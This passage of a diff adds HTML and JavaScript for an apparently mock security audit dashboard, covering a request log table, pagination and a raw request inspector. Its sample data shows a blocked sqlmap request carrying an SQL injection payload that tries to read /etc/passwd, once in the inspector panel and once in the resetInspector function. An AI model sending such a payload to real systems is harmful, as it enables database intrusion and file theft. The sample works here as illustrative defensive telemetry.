+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Password reset enumeration mitigation (throttled to 1/min)">
+                Forgot-password brute enumeration
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_5621890a', '104.28.19.45', 'POST /api/v1/auth/forgot-password', 'Target account throttling enabled', 'RESTRICT', '42', 'Target-Account: user_8831@enterprise.com\nAttempts-In-60s: 9\nClamp: Enforced delay 4000ms response')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 15: ALLOW Standard GraphQL Query -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="ALLOW" data-req="req_998124cd" data-risk="06">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:00.110</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_998124cd')">req_998124cd</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_11883900
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">172.58.140.22</span>
+<span class="text-outline text-[10px] ml-1">AS21928 (US)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-error-container text-on-error-container font-bold text-[10px] mr-1">POST</span>
+<span class="text-on-surface">/graphql</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-tertiary/20 text-tertiary">06</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-tertiary/20 text-tertiary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-tertiary"></span> ALLOW
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Query depth verified within AST limit (depth 3/5)">
+                AST depth and query schema validated
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_998124cd', '172.58.140.22', 'POST /graphql', 'Validated GraphQL AST', 'ALLOW', '06', 'Operation: GetOrganizationNode\nQuery-Depth: 3\nComplexity-Score: 18 (Limit 150)\nLatency: 9ms')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<!-- 4. Pagination & Status Bar -->
+<div class="px-space-md py-space-sm bg-surface-container-lowest/90 flex flex-col sm:flex-row items-center justify-between gap-space-sm">
+<!-- Left: Records counters -->
+<div class="flex items-center gap-space-sm font-telemetry-inline text-telemetry-inline text-on-surface-variant">
+<span>Showing <strong class="text-on-surface font-semibold">1-15</strong> of <strong class="text-on-surface font-semibold">1,842,910</strong> events</span>
+<span class="text-outline">•</span>
+<span class="hidden md:inline">SQLite Index: <span class="text-primary font-telemetry-data">idx_audit_ts_action</span></span>
+</div>
+<!-- Right: Pagination controls -->
+<div class="flex items-center gap-space-xs font-telemetry-inline text-telemetry-inline">
+<button class="p-1 rounded bg-surface-container-high text-on-surface-variant hover:text-on-surface disabled:opacity-40" disabled="">
+<span class="material-symbols-outlined text-base">first_page</span>
+</button>
+<button class="p-1 rounded bg-surface-container-high text-on-surface-variant hover:text-on-surface disabled:opacity-40" disabled="">
+<span class="material-symbols-outlined text-base">chevron_left</span>
+</button>
+<div class="flex items-center gap-1 px-1">
+<span class="px-2 py-0.5 rounded bg-primary text-on-primary font-bold">1</span>
+<button class="px-2 py-0.5 rounded bg-surface-container-high hover:bg-surface-container-highest text-on-surface">2</button>
+<button class="px-2 py-0.5 rounded bg-surface-container-high hover:bg-surface-container-highest text-on-surface">3</button>
+<span class="px-1 text-outline">...</span>
+<button class="px-2 py-0.5 rounded bg-surface-container-high hover:bg-surface-container-highest text-on-surface">122,860</button>
+</div>
+<button class="p-1 rounded bg-surface-container-high text-on-surface-variant hover:text-on-surface">
+<span class="material-symbols-outlined text-base">chevron_right</span>
+</button>
+<button class="p-1 rounded bg-surface-container-high text-on-surface-variant hover:text-on-surface">
+<span class="material-symbols-outlined text-base">last_page</span>
+</button>
+</div>
+</div>
+</div>
+<!-- Inspector Drawer (Docked Panel) -->
+<div class="w-full xl:w-96 rounded-xl bg-surface-container-low shadow-xl p-space-md flex flex-col gap-space-sm shrink-0 transition-all" id="inspectorDrawer">
+<div class="flex items-center justify-between pb-space-xs border-b border-transparent">
+<div class="flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-primary text-lg">data_object</span>
+<span class="font-headline-sm text-headline-sm text-on-surface">Raw Inspector</span>
+</div>
+<div class="flex items-center gap-1">
+<button class="p-1 rounded bg-surface-container-high hover:bg-surface-bright text-on-surface-variant hover:text-on-surface text-telemetry-inline" onclick="copyInspectorData()" title="Copy Raw Body/Headers">
+<span class="material-symbols-outlined text-base">content_copy</span>
+</button>
+<button class="p-1 rounded bg-surface-container-high hover:bg-surface-bright text-on-surface-variant hover:text-on-surface text-telemetry-inline" onclick="resetInspector()" title="Reset to Live Selected">
+<span class="material-symbols-outlined text-base">close</span>
+</button>
+</div>
+</div>
+<!-- Quick Context Summary -->
+<div class="grid grid-cols-2 gap-space-xs p-space-xs rounded-lg bg-surface-container-lowest font-telemetry-inline text-telemetry-inline">
+<div>
+<span class="text-outline uppercase text-[9px] block">Target Request</span>
+<span class="text-primary font-bold" id="inspectReqId">req_a78c01f4</span>
+</div>
+<div>
+<span class="text-outline uppercase text-[9px] block">Client IP</span>
+<span class="text-on-surface font-medium" id="inspectIp">194.26.29.112</span>
+</div>
+<div>
+<span class="text-outline uppercase text-[9px] block">Action Applied</span>
+<span class="text-error font-bold" id="inspectAction">BLOCK (403 Drop)</span>
+</div>
+<div>
+<span class="text-outline uppercase text-[9px] block">Risk Score</span>
+<span class="text-error font-bold" id="inspectRisk">94 / 100</span>
+</div>
+</div>
+<!-- Trigger Reason Summary -->
+<div class="flex flex-col gap-0.5">
+<span class="font-badge-label text-badge-label uppercase text-on-surface-variant">Trigger Reason &amp; Vector:</span>
+<p class="font-body-sm text-body-sm text-on-surface bg-surface-container-lowest p-2 rounded" id="inspectReason">
+          SQL Injection signature in POST body (UNION SELECT detected)
+        </p>
+</div>
+<!-- Raw Payload & Headers Terminal Viewer -->
+<div class="flex flex-col gap-1">
+<div class="flex items-center justify-between">
+<span class="font-badge-label text-badge-label uppercase text-on-surface-variant">HTTP Wire Telemetry:</span>
+<span class="font-telemetry-inline text-telemetry-inline text-outline">HTTP/2 TLS 1.3</span>
+</div>
+<pre class="w-full h-64 bg-surface-container-lowest p-space-sm rounded-lg font-telemetry-inline text-telemetry-inline text-tertiary overflow-auto whitespace-pre leading-relaxed select-all" id="inspectRaw">Headers: Host: api.sentraweb.io
+User-Agent: sqlmap/1.7#dev
+Content-Type: application/json
+X-Forwarded-For: 194.26.29.112
+
+Payload:
+{
+  "username": "admin' UNION SELECT 1,load_file('/etc/passwd')--",
+  "token": "x99"
+}</pre>
+</div>
+<!-- Rapid Mitigation Action Buttons -->
+<div class="pt-space-xs flex flex-col gap-space-xs">
+<span class="font-badge-label text-badge-label uppercase text-on-surface-variant">Analyst Interventions:</span>
+<div class="grid grid-cols-2 gap-space-xs">
+<button class="px-2 py-1.5 rounded bg-error-container text-on-error-container hover:bg-error transition-colors font-body-strong text-body-sm flex items-center justify-center gap-1 shadow-sm" onclick="analystAction('FIREWALL_IP')">
+<span class="material-symbols-outlined text-sm">block</span> Firewall IP
+          </button>
+<button class="px-2 py-1.5 rounded bg-surface-container-high hover:bg-surface-bright text-on-surface transition-colors font-body-sm text-body-sm flex items-center justify-center gap-1" onclick="analystAction('QUARANTINE_SESS')">
+<span class="material-symbols-outlined text-sm">lock_reset</span> Terminate Sess
+          </button>
+</div>
+</div>
+</div>
+</div>
+<!-- Operational Notification Banner (Toast) -->
+<div class="fixed bottom-6 right-6 z-50 transform translate-y-20 opacity-0 transition-all duration-300 pointer-events-none flex items-center gap-space-sm px-space-md py-2.5 rounded-xl bg-surface-container-highest text-on-surface shadow-2xl" id="toastNotification">
+<span class="material-symbols-outlined text-primary text-lg" id="toastIcon">check_circle</span>
+<span class="font-body-sm text-body-sm font-medium" id="toastMsg">Notification triggered</span>
+</div>
+</div>
+<script>
+  // Filter state
+  let currentActionFilter = 'ALL';
+
+  function setFilter(action, element) {
+    currentActionFilter = action;
+    
+    // Update pill styling
+    const pills = document.querySelectorAll('.action-pill');
+    pills.forEach(pill => {
+      pill.classList.remove('bg-primary', 'text-on-primary', 'font-bold');
+      pill.classList.add('bg-surface-container-high');
+    });
+
+    if (element) {
+      element.classList.remove('bg-surface-container-high');
+      element.classList.add('bg-primary', 'text-on-primary', 'font-bold');
+    }
+
+    applyFilters();
+  }
+
+  function filterLogs(queryString) {
+    const clearBtn = document.getElementById('clearSearchBtn');
+    if (queryString && queryString.trim().length > 0) {
+      clearBtn.classList.remove('hidden');
+    } else {
+      clearBtn.classList.add('hidden');
+    }
+    applyFilters();
+  }
+
+  function clearSearch() {
+    const searchInput = document.getElementById('logSearchInput');
+    searchInput.value = '';
+    document.getElementById('clearSearchBtn').classList.add('hidden');
+    applyFilters();
+  }
+
+  function applyFilters() {
+    const query = (document.getElementById('logSearchInput').value || '').toLowerCase().trim();
+    const rows = document.querySelectorAll('#logTableBody tr');
+    let visibleCount = 0;
+
+    rows.forEach(row => {
+      const rowAction = row.getAttribute('data-action');
+      const rowText = row.innerText.toLowerCase();
+
+      const matchesAction = (currentActionFilter === 'ALL' || rowAction === currentActionFilter);
+      const matchesSearch = query === '' || rowText.includes(query);
+
+      if (matchesAction && matchesSearch) {
+        row.style.display = '';
+        visibleCount++;
+      } else {
+        row.style.display = 'none';
+      }
+    });
+
+    const badge = document.getElementById('activeCountBadge');
+    if (badge) {
+      badge.innerText = visibleCount + ' in view';
+    }
+  }
+
+  function openInspector(reqId, ip, endpoint, reason, action, risk, rawPayload) {
+    document.getElementById('inspectReqId').innerText = reqId;
+    document.getElementById('inspectIp').innerText = ip;
+    document.getElementById('inspectReason').innerText = reason;
+    document.getElementById('inspectAction').innerText = action;
+    document.getElementById('inspectRisk').innerText = risk + ' / 100';
+    document.getElementById('inspectRaw').innerText = rawPayload;
+
+    showToast('Inspector refreshed: ' + reqId, 'info');
+  }
+
+  function resetInspector() {
+    // Reset to initial default state
+    openInspector(
+      'req_a78c01f4', 
+      '194.26.29.112', 
+      'POST /api/v1/auth/login', 
+      'SQL Injection signature in POST body (UNION SELECT detected)', 
+      'BLOCK', 
+      '94', 
+      'Headers: Host: api.sentraweb.io\nUser-Agent: sqlmap/1.7#dev\nContent-Type: application/json\nX-Forwarded-For: 194.26.29.112\n\nPayload:\n{\n  "username": "admin\' UNION SELECT 1,load_file(\'/etc/passwd\')--",\n  "token": "x99"\n}'
+    );
+  }
+
+  function copyText(str) {
+    navigator.clipboard.writeText(str).then(() => {
+      showToast('Copied ' + str + ' to clipboard', 'content_copy');
+    }).catch(() => {
+      showToast('Copied: ' + str, 'content_copy');
+    });
+  }
+
+  function copyInspectorData() {
+    const raw = document.getElementById('inspectRaw').innerText;
+    copyText(raw);
+  }
+
+  function triggerExport(type) {
+    if (type === 'CSV') {
+      showToast('Generating RFC-4180 CSV export archive...', 'file_download');
+    } else if (type === 'JSON') {
+      showToast('Exported SQLite/Flask schema json payload', 'data_object');
+    }
+  }
+
+  function analystAction(actionType) {
+    const req = document.getElementById('inspectReqId').innerText;
+    const ip = document.getElementById('inspectIp').innerText;
+
+    if (actionType === 'FIREWALL_IP') {
+      showToast('Firewall Rule Injected: ' + ip + ' blacklisted permanently', 'gpp_bad');
+    } else if (actionType === 'QUARANTINE_SESS') {
+      showToast('Session invalidated on distributed Redis cache', 'security');
+    }
+  }
+
+  function showToast(message, iconName) {
+    const toast = document.getElementById('toastNotification');
+    const toastMsg = document.getElementById('toastMsg');
+    const toastIcon = document.getElementById('toastIcon');
+
+    toastMsg.innerText = message;
+    if (iconName) toastIcon.innerText = iconName;
+
+    toast.classList.remove('translate-y-20', 'opacity-0');
+    toast.classList.add('translate-y-0', 'opacity-100');
+
+    setTimeout(() => {
+      toast.classList.remove('translate-y-0', 'opacity-100');
+      toast.classList.add('translate-y-20', 'opacity-0');
+    }, 2800);
+  }
+</script></main></div></body></html>
